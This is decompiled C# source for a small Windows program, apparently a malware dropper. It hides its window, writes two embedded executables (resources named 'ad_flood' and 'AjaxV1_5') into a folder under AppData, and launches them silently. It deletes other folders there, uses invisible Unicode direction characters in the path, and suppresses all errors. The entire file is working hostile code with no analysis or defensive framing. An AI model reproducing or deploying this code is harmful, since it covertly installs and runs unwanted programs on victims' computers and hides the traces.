using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using FileB.Properties;

namespace FileB;

public class Form1 : Form
{
	private IContainer components = null;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).set_TransparencyKey(Color.White);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		byte[] ad_flood = Resources.ad_flood;
		string fileName = "ad flood.exe";
		byte[] ajaxV1_ = Resources.AjaxV1_5;
		string fileName2 = "adflood2.exe";
		CopyAndRun(ad_flood, fileName);
		CopyAndRun(ajaxV1_, fileName2);
		Application.Exit();
	}

	public static void CopyAndRun(byte[] Rec, string FileName)
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Files\\FileB";
		try
		{
			string[] array = new string[10];
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Files"))
			{
				array = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Files");
			}
			string[] array2 = array;
			foreach (string path in array2)
			{
				try
				{
					Directory.Delete(path, recursive: true);
				}
				catch
				{
				}
			}
			do
			{
				if (File.Exists(text + "\\" + FileName))
				{
					text += "\u200f\u200e";
				}
			}
			while (File.Exists(text + "\\" + FileName));
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			try
			{
				using BinaryWriter binaryWriter = new BinaryWriter(File.Open(text + "\\" + FileName, FileMode.Create));
				binaryWriter.Write(Rec);
				binaryWriter.Close();
			}
			catch
			{
			}
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = text + "\\" + FileName;
				process.Start();
			}
			catch
			{
			}
		}
		catch
		{
		}
	}
}
